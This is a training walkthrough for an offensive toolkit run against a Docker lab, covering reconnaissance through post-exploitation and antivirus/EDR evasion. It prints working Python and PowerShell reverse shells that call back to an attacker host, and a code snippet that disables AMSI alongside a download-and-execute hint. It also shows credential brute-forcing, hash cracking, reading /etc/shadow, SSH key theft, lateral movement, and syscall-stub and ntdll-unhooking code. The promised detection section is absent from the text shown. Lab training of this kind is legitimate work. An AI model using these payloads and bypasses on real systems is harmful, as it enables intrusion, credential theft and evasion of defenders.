# Complete Penetration Testing Walkthrough

## CPTC11 Offensive Security Toolkit - End-to-End Assessment Guide

This walkthrough provides a comprehensive, step-by-step guide to conducting a full penetration test using the CPTC11 toolkit. The scenario demonstrates realistic attack methodologies from initial reconnaissance through post-exploitation, while also covering defensive detection techniques.

**Document Version:** 1.0
**Classification:** Training Use Only
**Target Audience:** Intermediate to Advanced Security Practitioners

---

## Table of Contents

1. [Scenario Setup](#scenario-setup)
2. [Phase 1: Reconnaissance](#phase-1-reconnaissance)
3. [Phase 2: Enumeration](#phase-2-enumeration)
4. [Phase 3: Exploitation](#phase-3-exploitation)
5. [Phase 4: Post-Exploitation](#phase-4-post-exploitation)
6. [Phase 5: Evasion Techniques](#phase-5-evasion-techniques)
7. [Phase 6: Detection (Blue Team)](#phase-6-detection-blue-team)
8. [Reporting Notes](#reporting-notes)

---

## Scenario Setup

### Environment Overview

This assessment targets a simulated corporate environment running in Docker containers. The environment consists of two primary network segments with multiple services replicating a realistic enterprise infrastructure.

### Network Topology

```
                         ATTACKER WORKSTATION
                                 |
                    +------------+------------+
                    |                         |
            ========+=========        ========+=========
            |  DMZ NETWORK   |        | INTERNAL NETWORK |
            | 10.10.10.0/24  |        |  10.10.20.0/24   |
            ==================        ===================
                    |                         |
        +-----------+-----------+    +--------+--------+--------+
        |           |           |    |        |        |        |
   +----+----+ +----+----+ +----+----+  +----+----+ +----+----+ +----+----+
   |  WEB    | |  FTP    | |  SMTP   |  |  SMB    | | MySQL   | | DC01    |
   | Server  | | Server  | | Server  |  | Server  | | Server  | |         |
   |.10.10.10| |.10.10.20| |.10.10.30|  |.10.20.50| |.10.20.60| |.10.20.5 |
   +---------+ +---------+ +---------+  +---------+ +---------+ +---------+
        |                                     |
   +----+----+                          +-----+-----+-----+
   |  DNS    |                          |     |     |     |
   | Server  |                       WS-1  WS-2  SRV-1
   |.10.10.40|                       .101  .102  .111
   +---------+
```

### Starting the Environment

```bash
# Navigate to the Docker environment
cd /Users/ic/cptc11/docker

# Start all services in detached mode
docker-compose up -d

# Verify all containers are running
docker-compose ps

# Expected output:
# NAME                      STATUS
# cptc11-vulnerable-web     Up
# cptc11-ftp-server        Up
# cptc11-smtp-server       Up
# cptc11-dns-server        Up
# cptc11-smb-server        Up
# cptc11-mysql-server      Up
# cptc11-workstation-1     Up
# cptc11-workstation-2     Up
# cptc11-server-1          Up
# cptc11-dc                Up
# cptc11-attack-platform   Up
```

### Scope Definition

**In-Scope Systems:**
- DMZ Network: 10.10.10.0/24
- Internal Network: 10.10.20.0/24
- All services accessible via port mappings on localhost

**In-Scope Services:**
| Service | Host Port | Target IP |
|---------|-----------|-----------|
| HTTP/HTTPS | 8080/8443 | 10.10.10.10 |
| FTP | 2121 | 10.10.10.20 |
| SMTP | 2525/587 | 10.10.10.30 |
| DNS | 5353 | 10.10.10.40 |
| SMB | 4445/1139 | 10.10.20.50 |
| MySQL | 3307 | 10.10.20.60 |
| SSH | 2222 | 10.10.20.111 |

### Rules of Engagement

1. **Authorization:** This is an authorized assessment of the Docker test environment
2. **Timing:** No time restrictions for lab environment
3. **Boundaries:** Stay within defined scope; do not pivot to host network
4. **Data Handling:** No real sensitive data; credentials are test-only
5. **Communication:** Document all findings and techniques used
6. **Cleanup:** Reset environment after assessment using `docker-compose down -v`

### Assessment Objectives

1. Identify all accessible services and potential entry points
2. Enumerate credentials and sensitive information
3. Achieve initial access to at least one system
4. Demonstrate lateral movement capabilities
5. Document findings with evidence for remediation
6. Test defensive detection capabilities

---

## Phase 1: Reconnaissance

### Objective

Discover live hosts, open ports, running services, and gather initial intelligence about the target environment without active exploitation.

### Step 1.1: Network Discovery

First, we identify live hosts on both network segments using the network-scanner tool.

```bash
# Navigate to the network scanner tool
cd /Users/ic/cptc11/python/tools/network-scanner

# Preview the scan plan for DMZ network
python tool.py 10.10.10.0/24 --plan

# Expected output:
# [PLAN MODE] Network Scanner Execution Plan
# ==========================================
# Target Network: 10.10.10.0/24
# Total Hosts to Scan: 254
# Scan Method: ICMP Echo + TCP SYN
# Estimated Duration: 30-60 seconds
#
# Actions:
# 1. Send ICMP echo requests to all hosts
# 2. Perform TCP SYN scan on common ports for non-responding hosts
# 3. Compile list of live hosts with response types

# Execute the actual scan
python tool.py 10.10.10.0/24 -v

# Expected output:
# [*] Starting network scan of 10.10.10.0/24
# [+] Host discovered: 10.10.10.10 (ICMP response)
# [+] Host discovered: 10.10.10.20 (ICMP response)
# [+] Host discovered: 10.10.10.30 (ICMP response)
# [+] Host discovered: 10.10.10.40 (ICMP response)
# [+] Host discovered: 10.10.10.100 (ICMP response)
# [*] Scan complete. 5 hosts discovered.

# Scan internal network
python tool.py 10.10.20.0/24 -v --json > /tmp/internal_hosts.json

# Expected output shows additional hosts:
# 10.10.20.5 (DC01)
# 10.10.20.10 (Web - internal)
# 10.10.20.50 (SMB)
# 10.10.20.60 (MySQL)
# 10.10.20.101 (Workstation-1)
# 10.10.20.102 (Workstation-2)
# 10.10.20.111 (Server-1)
```

### Step 1.2: Port Scanning

With live hosts identified, we perform detailed port scans to discover running services.

```bash
# Navigate to port scanner
cd /Users/ic/cptc11/python/tools/port-scanner

# Preview scan plan for web server
python tool.py 10.10.10.10 --plan

# Expected output:
# [PLAN MODE] Port Scanner Execution Plan
# =======================================
# Target: 10.10.10.10
# Port Range: 1-1000 (default common ports)
# Scan Type: TCP Connect
# Timeout: 1 second per port
#
# Actions:
# 1. Establish TCP connections to each port
# 2. Record open/closed/filtered states
# 3. Attempt service banner grab on open ports

# Full port scan on web server
python tool.py 10.10.10.10 -p 1-65535 -v

# Expected output:
# [*] Scanning 10.10.10.10 ports 1-65535
# [+] Port 80/tcp   - OPEN (HTTP)
# [+] Port 443/tcp  - OPEN (HTTPS)
# [*] Scan complete. 2 open ports found.

# Scan multiple targets with common ports
python tool.py 10.10.10.10,10.10.10.20,10.10.10.30,10.10.10.40 -p 21,22,25,53,80,443,445,3306 -v

# Expected results summary:
# 10.10.10.10: 80, 443 (web)
# 10.10.10.20: 21 (ftp)
# 10.10.10.30: 25, 587 (smtp)
# 10.10.10.40: 53 (dns)
```

### Step 1.3: Service Fingerprinting

Identify specific service versions and technologies to find potential vulnerabilities.

```bash
# Navigate to service fingerprinter
cd /Users/ic/cptc11/python/tools/service-fingerprinter

# Preview fingerprinting plan
python tool.py 10.10.10.10 -p 80,443 --plan

# Expected output:
# [PLAN MODE] Service Fingerprinter Execution Plan
# ================================================
# Target: 10.10.10.10
# Ports: 80, 443
#
# Actions:
# 1. Connect to each port
# 2. Send protocol-specific probes
# 3. Analyze responses for version strings
# 4. Match against signature database

# Execute fingerprinting on web server
python tool.py 10.10.10.10 -p 80,443 -v

# Expected output:
# [*] Fingerprinting 10.10.10.10:80
# [+] Service: Apache/2.4.54 (Debian)
# [+] Headers detected: PHP/8.1.12
# [*] Fingerprinting 10.10.10.10:443
# [+] Service: Apache/2.4.54 (Debian)
# [+] SSL/TLS: TLSv1.2, TLSv1.3
# [+] Certificate CN: vulnerable-web.testlab.local

# Fingerprint FTP server
python tool.py 10.10.10.20 -p 21 -v

# Expected output:
# [*] Fingerprinting 10.10.10.20:21
# [+] Service: vsftpd 3.0.5
# [+] Banner: 220 Welcome to CPTC11 FTP Server
# [+] Features: AUTH TLS, PASV, UTF8
```

### Step 1.4: DNS Enumeration

Extract DNS records to map the domain structure and discover additional hosts.

```bash
# Navigate to DNS enumerator
cd /Users/ic/cptc11/python/tools/dns-enumerator

# Preview enumeration plan
python tool.py testlab.local -n 127.0.0.1:5353 --plan

# Expected output:
# [PLAN MODE] DNS Enumerator Execution Plan
# =========================================
# Domain: testlab.local
# Nameserver: 127.0.0.1:5353
#
# Actions:
# 1. Query SOA record
# 2. Query NS records
# 3. Query A/AAAA records
# 4. Query MX records
# 5. Attempt zone transfer (AXFR)
# 6. Brute force common subdomains

# Execute DNS enumeration with zone transfer
python tool.py testlab.local -n 127.0.0.1:5353 -z -v

# Expected output:
# [*] Enumerating DNS for testlab.local
# [+] SOA: ns1.testlab.local admin.testlab.local
# [+] NS: ns1.testlab.local -> 10.10.10.40
# [+] A: testlab.local -> 10.10.10.10
# [+] A: www.testlab.local -> 10.10.10.10
# [+] A: ftp.testlab.local -> 10.10.10.20
# [+] A: mail.testlab.local -> 10.10.10.30
# [+] A: ns1.testlab.local -> 10.10.10.40
# [+] A: dc01.testlab.local -> 10.10.20.5
# [+] A: fileserver.testlab.local -> 10.10.20.50
# [+] A: db.testlab.local -> 10.10.20.60
# [+] MX: mail.testlab.local (priority 10)
# [!] Zone transfer successful - retrieved 15 records
# [*] Enumeration complete.
```

### Reconnaissance Summary

```
+------------------------------------------------------------------+
|                    RECONNAISSANCE FINDINGS                        |
+------------------------------------------------------------------+
| Live Hosts Discovered: 12                                         |
| Open Ports Identified: 18                                         |
| Services Fingerprinted: 8                                         |
| DNS Records Retrieved: 15 (via zone transfer)                     |
+------------------------------------------------------------------+
| HIGH-VALUE TARGETS:                                               |
| - Web Server (10.10.10.10) - Apache/PHP                          |
| - FTP Server (10.10.10.20) - vsftpd 3.0.5                        |
| - SMB Server (10.10.20.50) - Samba                               |
| - Domain Controller (10.10.20.5)                                  |
+------------------------------------------------------------------+
```

---

## Phase 2: Enumeration

### Objective

Perform deep enumeration of discovered services to identify credentials, sensitive files, misconfigurations, and potential attack vectors.

### Step 2.1: Web Directory Enumeration

Discover hidden directories, files, and endpoints on the web server.

```bash
# Navigate to web directory enumerator
cd /Users/ic/cptc11/python/tools/web-directory-enumerator

# Preview enumeration plan
python tool.py http://localhost:8080 --plan

# Expected output:
# [PLAN MODE] Web Directory Enumerator Execution Plan
# ===================================================
# Target: http://localhost:8080
# Wordlist: /usr/share/wordlists/dirb/common.txt (default)
# Extensions: .php, .html, .txt, .bak
# Threads: 10
#
# Actions:
# 1. Check robots.txt for disallowed paths
# 2. Request each wordlist entry
# 3. Detect response codes and content length
# 4. Recursively enumerate discovered directories

# Execute enumeration
python tool.py http://localhost:8080 -v -e php,txt,bak

# Expected output:
# [*] Starting enumeration on http://localhost:8080
# [+] 200 - /index.php (4521 bytes)
# [+] 200 - /login.php (2134 bytes)
# [+] 200 - /robots.txt (312 bytes)
# [+] 301 - /admin/ -> /admin/index.php
# [+] 200 - /admin/login.php (1876 bytes)
# [+] 200 - /backup.bak (15234 bytes) [!] SENSITIVE
# [+] 200 - /config.php.bak (892 bytes) [!] SENSITIVE
# [+] 403 - /server-status
# [+] 301 - /uploads/
# [+] 200 - /api/
# [*] Found 10 paths. Sensitive files detected.

# Check robots.txt content
curl http://localhost:8080/robots.txt

# Expected output:
# User-agent: *
# Disallow: /admin/
# Disallow: /backup/
# Disallow: /config/
# Disallow: /api/internal/
```

### Step 2.2: SMB Share Enumeration

Enumerate SMB shares to find accessible file shares and sensitive data.

```bash
# Navigate to SMB enumerator
cd /Users/ic/cptc11/python/tools/smb-enumerator

# Preview enumeration plan
python tool.py localhost --port 4445 --plan

# Expected output:
# [PLAN MODE] SMB Enumerator Execution Plan
# =========================================
# Target: localhost:4445
#
# Actions:
# 1. Attempt null session connection
# 2. Enumerate available shares
# 3. List share permissions
# 4. Attempt anonymous access to each share
# 5. Enumerate users via RID cycling

# Execute SMB enumeration
python tool.py localhost --port 4445 -v

# Expected output:
# [*] Connecting to localhost:4445
# [+] Null session successful
# [*] Enumerating shares...
#
# SHARE          TYPE      ACCESS    COMMENT
# -----          ----      ------    -------
# public         Disk      READ      Public share
# private        Disk      NONE      Private documents
# backup         Disk      NONE      Backup files
# it             Disk      NONE      IT Department
# hr             Disk      NONE      HR Documents
# finance        Disk      NONE      Financial Records
# admin$         IPC       NONE      Admin share
#
# [*] Enumerating users via RID cycling...
# [+] User: Administrator (RID 500)
# [+] User: Guest (RID 501)
# [+] User: smbuser (RID 1001)
# [+] User: backup (RID 1002)
# [+] User: admin (RID 1003)
# [*] Enumeration complete.

# Enumerate with credentials
python tool.py localhost --port 4445 -u smbuser -p smbpass123 -v

# Expected output:
# [+] Authenticated as smbuser
# SHARE          TYPE      ACCESS    COMMENT
# public         Disk      READ      Public share
# private        Disk      READ      Private documents
# backup         Disk      NONE      Backup files
# it             Disk      READ      IT Department
```

### Step 2.3: Credential Discovery

Test for default and weak credentials across discovered services.

```bash
# Navigate to credential validator
cd /Users/ic/cptc11/python/tools/credential-validator

# Test FTP with common credentials
python tool.py localhost --protocol ftp --port 2121 -u admin -P admin123 -v

# Expected output:
# [*] Testing FTP credentials on localhost:2121
# [+] SUCCESS: admin:admin123
# [*] Testing complete.

# Test multiple credentials against FTP
python tool.py localhost --protocol ftp --port 2121 \
    -U /Users/ic/cptc11/wordlists/users.txt \
    -P /Users/ic/cptc11/wordlists/passwords.txt -v

# Expected output:
# [*] Testing 50 credential combinations
# [+] SUCCESS: ftpuser:ftppass123
# [+] SUCCESS: admin:admin123
# [+] SUCCESS: backup:backup2024
# [*] Found 3 valid credential pairs.

# Test SMTP credentials
python tool.py localhost --protocol smtp --port 2525 \
    -u smtpuser -P smtppass123 -v

# Expected output:
# [*] Testing SMTP credentials on localhost:2525
# [+] SUCCESS: smtpuser:smtppass123
# [+] Server supports: AUTH PLAIN, AUTH LOGIN

# Test SSH credentials
python tool.py localhost --protocol ssh --port 2222 \
    -u admin -P admin123 -v

# Expected output:
# [*] Testing SSH credentials on localhost:2222
# [+] SUCCESS: admin:admin123
# [+] Shell access available
```

### Step 2.4: Service Version Analysis

Compile service versions for vulnerability research.

```
+------------------------------------------------------------------+
|                    ENUMERATION FINDINGS                           |
+------------------------------------------------------------------+
| Web Application:                                                  |
| - /admin/ - Administrative interface found                        |
| - /backup.bak - Database backup exposed                          |
| - /config.php.bak - Configuration file with credentials          |
| - Form-based authentication on /login.php                        |
+------------------------------------------------------------------+
| SMB Shares:                                                       |
| - public (anonymous read)                                         |
| - private, it (authenticated read with smbuser)                  |
| - Users enumerated: Administrator, smbuser, backup, admin        |
+------------------------------------------------------------------+
| Valid Credentials Discovered:                                     |
| - FTP: admin:admin123, ftpuser:ftppass123, backup:backup2024    |
| - SMTP: smtpuser:smtppass123, admin:admin123                     |
| - SSH: admin:admin123                                             |
| - SMB: smbuser:smbpass123                                        |
+------------------------------------------------------------------+
```

---

## Phase 3: Exploitation

### Objective

Leverage discovered vulnerabilities and credentials to gain initial access to target systems.

### Step 3.1: Credential Validation and Access

Verify credentials provide useful access to target systems.

```bash
# Validate SSH access and test command execution
cd /Users/ic/cptc11/python/tools/credential-validator

python tool.py localhost --protocol ssh --port 2222 \
    -u admin -P admin123 --execute "id && hostname" -v

# Expected output:
# [*] Testing SSH credentials on localhost:2222
# [+] SUCCESS: admin:admin123
# [*] Executing command: id && hostname
# uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)
# cptc11-server-1
# [+] User has sudo group membership

# Test MySQL access
python tool.py localhost --protocol mysql --port 3307 \
    -u webuser -P webpass123 --execute "SELECT user();" -v

# Expected output:
# [*] Testing MySQL credentials on localhost:3307
# [+] SUCCESS: webuser:webpass123
# [*] Executing query: SELECT user();
# +------------------+
# | user()           |
# +------------------+
# | webuser@10.10.10.100 |
# +------------------+
```

### Step 3.2: Hash Extraction and Cracking

Extract and crack password hashes from accessible files.

```bash
# Navigate to hash cracker
cd /Users/ic/cptc11/python/tools/hash-cracker

# Assume we extracted hashes from backup.bak file:
# $1$xyz$pQr8Nk2mVh1xLm9bKj3Aq1 (admin)
# $1$abc$Xm9Lk2pQr8Nk2mVh1xLm9b (webmaster)

# Preview cracking plan
python tool.py '$1$xyz$pQr8Nk2mVh1xLm9bKj3Aq1' --plan

# Expected output:
# [PLAN MODE] Hash Cracker Execution Plan
# =======================================
# Hash: $1$xyz$pQr8Nk2mVh1xLm9bKj3Aq1
# Detected Type: MD5crypt ($1$)
#
# Actions:
# 1. Attempt common password list
# 2. Apply rule-based mutations
# 3. Attempt hybrid attack (wordlist + masks)
# 4. Report results

# Crack hash with wordlist
python tool.py '$1$xyz$pQr8Nk2mVh1xLm9bKj3Aq1' \
    -w /Users/ic/cptc11/wordlists/rockyou-sample.txt -v

# Expected output:
# [*] Hash type detected: MD5crypt
# [*] Loading wordlist: rockyou-sample.txt (10000 entries)
# [*] Starting dictionary attack...
# [+] CRACKED: $1$xyz$pQr8Nk2mVh1xLm9bKj3Aq1 -> admin123
# [*] Time elapsed: 2.3 seconds
# [*] Hashes cracked: 1/1

# Crack multiple hashes from file
python tool.py -f /tmp/extracted_hashes.txt \
    -w /Users/ic/cptc11/wordlists/rockyou-sample.txt --rules -v

# Expected output:
# [*] Loaded 5 hashes from file
# [+] CRACKED: admin -> admin123
# [+] CRACKED: webmaster -> webmaster1
# [+] CRACKED: testuser -> testpass
# [*] Cracked 3/5 hashes
```

### Step 3.3: Payload Generation

Generate payloads for establishing persistent access.

```bash
# Navigate to payload generator
cd /Users/ic/cptc11/python/tools/payload-generator

# Preview payload generation plan
python tool.py --type reverse_shell --lang python \
    --lhost 10.10.10.100 --lport 4444 --plan

# Expected output:
# [PLAN MODE] Payload Generator Execution Plan
# ============================================
# Type: reverse_shell
# Language: python
# LHOST: 10.10.10.100
# LPORT: 4444
# Encoding: none
# Obfuscation: 0
#
# Actions:
# 1. Generate Python reverse shell code
# 2. Configure connection parameters
# 3. Apply encoding if specified
# 4. Apply obfuscation if specified
# 5. Output payload

# Generate Python reverse shell
python payload_generator.py --type reverse_shell --lang python \
    --lhost 10.10.10.100 --lport 4444 -v

# Expected output:
# [*] Generating python reverse_shell payload
# [+] Target: 10.10.10.100:4444
#
# === PAYLOAD ===
# import socket,subprocess,os
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# s.connect(("10.10.10.100",4444))
# os.dup2(s.fileno(),0)
# os.dup2(s.fileno(),1)
# os.dup2(s.fileno(),2)
# subprocess.call(["/bin/sh","-i"])
# === END PAYLOAD ===
#
# [*] Payload size: 234 bytes

# Generate obfuscated PowerShell payload
python payload_generator.py --type reverse_shell --lang powershell \
    --lhost 10.10.10.100 --lport 4444 --obfuscate 2 --encoding base64 -v

# Expected output:
# [*] Generating powershell reverse_shell payload
# [+] Obfuscation level: 2
# [+] Encoding: base64
#
# === PAYLOAD ===
# powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUA...
# === END PAYLOAD ===
#
# [*] Payload size: 892 bytes (encoded)
```

### Step 3.4: Initial Access

Establish initial foothold using discovered credentials and payloads.

```bash
# Navigate to reverse shell handler
cd /Users/ic/cptc11/python/tools/reverse-shell-handler

# Start listener
python tool.py --listen --port 4444 -v

# Expected output:
# [*] Starting reverse shell handler on 0.0.0.0:4444
# [*] Waiting for incoming connections...

# In another terminal, trigger payload via SSH
ssh admin@localhost -p 2222

# Once connected, execute payload:
# python3 -c 'import socket,subprocess,os;s=socket.socket(...)'

# Handler output:
# [+] Connection received from 10.10.20.111:54321
# [+] Shell established
# [*] Type 'exit' to close connection
#
# $ id
# uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)
# $ hostname
# cptc11-server-1
```

### Exploitation Summary

```
ATTACK FLOW DIAGRAM
===================

    +------------------+     +------------------+
    | Attacker Machine |---->| Credential       |
    | 10.10.10.100     |     | Validation       |
    +------------------+     +--------+---------+
                                      |
                    +-----------------+-----------------+
                    |                 |                 |
           +--------v--------+ +------v-------+ +-------v-------+
           | FTP Access      | | SSH Access   | | MySQL Access  |
           | admin:admin123  | | admin:admin123| | webuser:...   |
           +-----------------+ +------+-------+ +---------------+
                                      |
                              +-------v-------+
                              | Payload       |
                              | Deployment    |
                              +-------+-------+
                                      |
                              +-------v-------+
                              | Reverse Shell |
                              | Established   |
                              +---------------+
```

---

## Phase 4: Post-Exploitation

### Objective

Maintain access, escalate privileges, and move laterally through the network.

### Step 4.1: Reverse Shell Stabilization

Upgrade and stabilize the reverse shell for reliable operation.

```bash
# On the handler, after receiving connection:
# Upgrade to PTY shell (on victim)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'

# Set terminal environment
$ export TERM=xterm
$ export SHELL=/bin/bash

# Background the shell and configure terminal
# Press Ctrl+Z
# stty raw -echo; fg

# Now we have a fully interactive shell
admin@cptc11-server-1:~$ whoami
admin

admin@cptc11-server-1:~$ sudo -l
Matching Defaults entries for admin on cptc11-server-1:
    env_reset, mail_badpass

User admin may run the following commands on cptc11-server-1:
    (ALL : ALL) ALL
```

### Step 4.2: Privilege Escalation

Elevate privileges to root using discovered sudo access.

```bash
# Since admin has full sudo, escalation is straightforward
admin@cptc11-server-1:~$ sudo su -

# Expected output:
root@cptc11-server-1:~# id
uid=0(root) gid=0(root) groups=0(root)

root@cptc11-server-1:~# cat /etc/shadow | head -3
root:$6$rounds=656000$salt$hashvalue...:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
admin:$6$rounds=656000$salt$hashvalue...:19000:0:99999:7:::
```

### Step 4.3: Credential Harvesting

Extract credentials from the compromised system for lateral movement.

```bash
# Check for stored credentials
root@cptc11-server-1:~# cat /home/admin/.bash_history | grep -i pass
mysql -u webuser -pwebpass123
smbclient //fileserver/backup -U backup%backup2024

# Check SSH keys
root@cptc11-server-1:~# ls -la /home/*/.ssh/
/home/admin/.ssh/:
-rw------- 1 admin admin 2602 Jan 10 10:00 id_rsa
-rw-r--r-- 1 admin admin  571 Jan 10 10:00 id_rsa.pub

# Extract SSH private key
root@cptc11-server-1:~# cat /home/admin/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

### Step 4.4: Lateral Movement

Use harvested credentials to access additional systems.

```bash
# From compromised server, pivot to workstation
root@cptc11-server-1:~# ssh -i /home/admin/.ssh/id_rsa admin@10.10.20.101

# Expected output:
admin@cptc11-workstation-1:~$ hostname
cptc11-workstation-1

# Access SMB share with harvested credentials
root@cptc11-server-1:~# smbclient //10.10.20.50/backup -U backup%backup2024

smb: \> ls
  .                                   D        0  Jan 10 09:00
  ..                                  D        0  Jan 10 09:00
  database_backup.sql                 A  1048576  Jan 10 08:00
  config_backup.tar.gz                A   524288  Jan 10 08:00
  credentials.txt                     A     1024  Jan 10 07:00

smb: \> get credentials.txt
getting file \credentials.txt of size 1024 as credentials.txt
```

### Post-Exploitation Summary

```
LATERAL MOVEMENT MAP
====================

                    +-------------------+
                    |   Initial Access  |
                    |   Server-1        |
                    |   10.10.20.111    |
                    +---------+---------+
                              |
         +--------------------+--------------------+
         |                    |                    |
+--------v--------+  +--------v--------+  +--------v--------+
| Workstation-1   |  | SMB Server      |  | MySQL Server    |
| 10.10.20.101    |  | 10.10.20.50     |  | 10.10.20.60     |
| (SSH key auth)  |  | (backup creds)  |  | (webuser creds) |
+-----------------+  +-----------------+  +-----------------+
         |
+--------v--------+
| Workstation-2   |
| 10.10.20.102    |
| (credential     |
|  reuse)         |
+-----------------+
```

---

## Phase 5: Evasion Techniques

### Objective

Demonstrate advanced evasion techniques to bypass security controls during offensive operations.

### Step 5.1: AMSI Bypass

Generate payloads that bypass Windows Antimalware Scan Interface.

```bash
# Navigate to AMSI bypass tool
cd /Users/ic/cptc11/python/tools/amsi-bypass

# Preview bypass generation plan
python amsi_bypass.py --technique amsi_scan_buffer_patch --plan

# Expected output:
# [PLAN MODE] AMSI Bypass Generator Execution Plan
# ================================================
# Technique: amsi_scan_buffer_patch
#
# Description:
# Patches AmsiScanBuffer function in memory to return clean result
# for all scanned content, effectively disabling AMSI.
#
# Actions:
# 1. Generate PowerShell bypass code
# 2. Apply obfuscation if specified
# 3. Output payload ready for execution

# Generate AMSI bypass with obfuscation
python amsi_bypass.py --technique amsi_scan_buffer_patch --obfuscate 2 -v

# Expected output:
# [*] Generating AMSI bypass: amsi_scan_buffer_patch
# [*] Obfuscation level: 2
#
# === BYPASS PAYLOAD ===
# $a=[Ref].Assembly.GetTypes()
# ForEach($b in $a) {if ($b.Name -like "*iUtils") {
# $c=$b.GetFields('NonPublic,Static')
# ForEach($d in $c) {if ($d.Name -like "*Context") {
# $d.SetValue($null,[IntPtr]::Zero)}}}}
# === END PAYLOAD ===
#
# [+] Bypass generated successfully
# [*] Test with: IEX(New-Object Net.WebClient).DownloadString('http://...')

# Generate chained bypass for maximum evasion
python amsi_bypass.py --chain amsi_scan_buffer_patch,etw_patching \
    --obfuscate 3 --base64 -v

# Expected output:
# [*] Generating chained bypass
# [*] Techniques: amsi_scan_buffer_patch -> etw_patching
# [*] Base64 encoding enabled
#
# === ENCODED PAYLOAD ===
# powershell -enc JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4A...
# === END PAYLOAD ===
```

### Step 5.2: Shellcode Encoding

Encode shellcode to evade signature-based detection.

```bash
# Navigate to shellcode encoder
cd /Users/ic/cptc11/python/tools/shellcode-encoder

# Preview encoding plan
python shellcode_encoder.py --input /tmp/payload.bin \
    --encoding xor --plan

# Expected output:
# [PLAN MODE] Shellcode Encoder Execution Plan
# ============================================
# Input: /tmp/payload.bin
# Encoding: XOR
# Key: (random 4-byte key)
#
# Actions:
# 1. Read input shellcode
# 2. Generate random XOR key
# 3. Apply XOR encoding to each byte
# 4. Prepend decoder stub
# 5. Output encoded shellcode

# Encode with XOR and output as C array
python shellcode_encoder.py --input /tmp/payload.bin \
    --encoding xor --key 0xDEADBEEF --format c_array -v

# Expected output:
# [*] Reading shellcode from /tmp/payload.bin
# [*] Original size: 276 bytes
# [*] Applying XOR encoding with key: 0xDEADBEEF
#
# === ENCODED SHELLCODE (C Array) ===
# unsigned char shellcode[] = {
#     0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0x01,
#     0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0x01,
#     // ... truncated ...
# };
# unsigned int shellcode_len = 312;
# === END SHELLCODE ===
#
# [+] Encoded size: 312 bytes (includes decoder stub)

# Multi-layer encoding for maximum evasion
python shellcode_encoder.py --input /tmp/payload.bin \
    --chain xor,rc4,base64 --null-free --format powershell -v

# Expected output:
# [*] Applying chained encoding: xor -> rc4 -> base64
# [*] Null-byte removal enabled
#
# === ENCODED SHELLCODE (PowerShell) ===
# $shellcode = [Convert]::FromBase64String("TVqQAAMAAAAEAAAA...")
# $decoder = {
#     # RC4 decoder
#     # XOR decoder
#     # Execute
# }
# === END SHELLCODE ===
```

### Step 5.3: EDR Evasion

Generate code to evade Endpoint Detection and Response systems.

```bash
# Navigate to EDR evasion toolkit
cd /Users/ic/cptc11/python/tools/edr-evasion-toolkit

# Preview evasion technique
python edr_evasion.py --technique direct_syscalls --plan

# Expected output:
# [PLAN MODE] EDR Evasion Toolkit Execution Plan
# ==============================================
# Technique: direct_syscalls
#
# Description:
# Bypass user-mode hooks by invoking syscalls directly,
# avoiding hooked ntdll.dll functions.
#
# Supported Syscalls:
# - NtAllocateVirtualMemory (SSN: 0x18)
# - NtWriteVirtualMemory (SSN: 0x3A)
# - NtCreateThreadEx (SSN: 0xC1)
# - NtProtectVirtualMemory (SSN: 0x50)
#
# Actions:
# 1. Generate syscall stubs for target functions
# 2. Include syscall number resolution
# 3. Output assembly/C code for integration

# Generate direct syscall code
python edr_evasion.py --technique direct_syscalls \
    --syscall NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -v

# Expected output:
# [*] Generating direct syscall stubs
# [*] Target syscalls: NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx
#
# === SYSCALL STUBS (x64 Assembly) ===
# ; NtAllocateVirtualMemory
# NtAllocateVirtualMemory PROC
#     mov r10, rcx
#     mov eax, 18h        ; SSN for Win10/Win11
#     syscall
#     ret
# NtAllocateVirtualMemory ENDP
#
# ; NtWriteVirtualMemory
# NtWriteVirtualMemory PROC
#     mov r10, rcx
#     mov eax, 3Ah
#     syscall
#     ret
# NtWriteVirtualMemory ENDP
#
# ; NtCreateThreadEx
# NtCreateThreadEx PROC
#     mov r10, rcx
#     mov eax, 0C1h
#     syscall
#     ret
# NtCreateThreadEx ENDP
# === END STUBS ===

# Generate unhooking code
python edr_evasion.py --technique full_unhooking -v

# Expected output:
# [*] Generating ntdll unhooking code
#
# === UNHOOKING CODE (C) ===
# BOOL UnhookNtdll() {
#     // 1. Map fresh copy of ntdll from disk
#     HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll"...);
#
#     // 2. Find .text section of both copies
#     // 3. Copy clean .text over hooked version
#     // 4. Restore memory protection
#
#     return TRUE;
# }
# === END CODE ===

# Generate API hashing code for import obfuscation
python edr_evasion.py --technique api_hashing --hash-algorithm djb2 -v

# Expected output:
# [*] Generating API hashing resolver
# [*] Algorithm: DJB2
#
# === API HASH VALUES ===
# VirtualAlloc:     0x91AFCA54
# VirtualProtect:   0x7946C61B
# CreateThread:     0xE553A458
# LoadLibraryA:     0x0726774C
# GetProcAddress:   0xFFD97FB
# === END HASHES ===
```

### Evasion Techniques Summary

```
EVASION LAYERING STRATEGY
=========================

    +--------------------------------------------------+
    |              DETECTION AVOIDANCE                  |
    +--------------------------------------------------+
                           |
         +-----------------+-----------------+
         |                 |                 |
    +----v----+       +----v----+       +----v----+
    |  AMSI   |       |Shellcode|       |   EDR   |
    | Bypass  |       |Encoding |       | Evasion |
    +---------+       +---------+       +---------+
         |                 |                 |
    +----v----+       +----v----+       +----v----+
    |Patch    |       |XOR +    |       |Direct   |
    |AmsiScan |       |RC4 +    |       |Syscalls |
    |Buffer   |       |Base64   |       |         |
    +---------+       +---------+       +---------+
         |                 |                 |
         +-----------------+-----------------+
                           |
                    +------v------+
                    |   PAYLOAD   |
                    |  EXECUTION  |
                    +-------------+
